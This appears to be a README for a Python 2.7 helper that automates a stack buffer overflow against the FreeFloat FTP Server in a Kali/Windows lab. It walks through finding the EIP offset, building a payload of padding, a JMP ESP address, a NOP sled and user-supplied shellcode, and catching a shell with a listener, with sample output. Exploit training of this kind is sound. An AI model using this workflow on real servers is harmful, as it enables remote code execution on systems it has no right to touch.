# Buffer_helper

* Buffer_Helper.py Help To Test Buffer overflow FTP Server Exploit .

* write by python 2.7

## Required
* generate your own shell code and replace it in the buffer_helper.py

* create your listner use msfconsloe or netcat


### steps 

1- add the string as input you can use any character input .

 * make sure your string input above "300" character.

 * the buffer_helper  will give output the random sting automatically have same length of the input string .

 * input can be  "aaaaaaaaaaaaa or AAAAAAAA or 11111111/22222222"
```
Examples 

[+]Enter your reguset:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 

[+]character length is : 38 

[+]Generated String is: taoeboshifrhuyloeggipydyizkdrqnmtjzxdx

[+]The New character length is: 38


```

2- input the ip address of FTP server and the port .

* buffer_helper will send the data to server .
```
Examples 

[+]server ip : 10.195.100.230

[+]server port :21

[+]data send successful...!!!

```

### over write

3- after the EIP address get over write  .


* input the  EIP address as hexadecimal . 7755BBFF or 7755bbff .

* buffer_helper will compile  hexadecimal unmber to ASCII and prnit out.

* will print out Exact satch at offset .

```
Examples 

[+]Enter hexadecimal Crach address: 79726d74

[+]The ASCII Value  is :  tmry

[+]Exact satch at offset :  251

```
### little endian network style  . 

* buffer_helper will ask for JMP ESP address.

* input it as hexadecimal 7755BBFF or 7755bbff 

* the buffer_helper will reversed automatically and  print  it as "\xFF\x\bbx\x55\x77"

```
Example:


[+] Enter JMP ESP addrsss HEX  : 75c24e5b

[+]little endian JMP ESP  is :  \x5B\x4E\xC2\x75


```


### attack
* buffer_helper will  management and handling the attack

* calculates automatically and send all payload to server and print out the result.

```
 Example

[+] attack = 251 of "A" + JMP ESP = \x5B\x4E\xC2\x75 + 144 of("\x90")  + shell code

[+]conncet server ip is  :  10.195.100.230

[+]conncet server port is  :  21

[+]WE READY TO ATTACK !![+]

[+]data send successful...!!!

[+]-------------------------{THANK YOU}--------------------------[+]

 ____         __  __             _   _      _                  
| __ ) _   _ / _|/ _| ___ _ __  | | | | ___| |_ __   ___ _ __  
|  _ \| | | | |_| |_ / _ \ '__| | |_| |/ _ \ | '_ \ / _ \ '__| 
| |_) | |_| |  _|  _|  __/ |    |  _  |  __/ | |_) |  __/ |    
|____/ \__,_|_| |_|  \___|_|    |_| |_|\___|_| .__/ \___|_|    
                                             |_|        

```

# All Steps



```
 ____         __  __             _   _      _                  
| __ ) _   _ / _|/ _| ___ _ __  | | | | ___| |_ __   ___ _ __  
|  _ \| | | | |_| |_ / _ \ '__| | |_| |/ _ \ | '_ \ / _ \ '__| 
| |_) | |_| |  _|  _|  __/ |    |  _  |  __/ | |_) |  __/ |    
|____/ \__,_|_| |_|  \___|_|    |_| |_|\___|_| .__/ \___|_|    
                                             |_|        


[+]Enter your reguset:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

[+]character length is : 399

[+]Generated String is: rxgixmqoraszkfokqpbyexikbraqjossknbkjtlhbzatqmkxggqibjqfqcccvcgazfaxwtqreqzliyhglwnhfiiexhvrpcgiefqwaraqchhjywhxwfvmurdwelikuywgbvelqsxoaivhhykqaajizxwyobfcpfatnhzbwplteeanhbxcvnsnilnfpctlhlopvocmuciezjbyrgdfcspjahklvwrhfnafkammbucrzoljlobqzlsfmgrhikptmryomphwisryixvhrfmxsjcdjmnbagxhqlxpnzxptecckpvwmnscclkkiskhzmggdjkmalzmyjeyobgdscowqzunlgqshbaikplkekpqulpkmelilkqmataboikcgzzzznhurxcldwfnhefbyhy

[+]The New character length is: 399

[+]server ip : 10.195.100.230

[+]server port :21

[+]data send successful...!!!

[+]Enter hexadecimal Crach address: 79726d74

[+]The ASCII Value  is :  tmry

[+]Exact satch at offset :  251

[+] Enter JMP ESP addrsss HEX  : 75c24e5b

[+]little endian JMP ESP  is :  \x5B\x4E\xC2\x75

[+] attack = 251 of "A" + JMP ESP = \x5B\x4E\xC2\x75 + 144 of("\x90")  + shell code

[+]conncet server ip is  :  10.195.100.230

[+]conncet server port is  :  21

[+]WE READY TO ATTACK !![+]

[+]data send successful...!!!

[+]-------------------------{THANK YOU}--------------------------[+]

 ____         __  __             _   _      _                  
| __ ) _   _ / _|/ _| ___ _ __  | | | | ___| |_ __   ___ _ __  
|  _ \| | | | |_| |_ / _ \ '__| | |_| |/ _ \ | '_ \ / _ \ '__| 
| |_) | |_| |  _|  _|  __/ |    |  _  |  __/ | |_) |  __/ |    
|____/ \__,_|_| |_|  \___|_|    |_| |_|\___|_| .__/ \___|_|    
                                             |_|        

```
## Required Software / Setup

* attacker system: Kali Linux

* Victim system: Windows 

* Immunity debugger  https://www.immunityinc.com/products/debugger/

* FloatFTP - The application we are going to exploit  https://archive.org/details/tucows_367516_Freefloat_FTP_Server


##  for Contact  

* administrator@jacstory.tech 

* thank you for reading it 
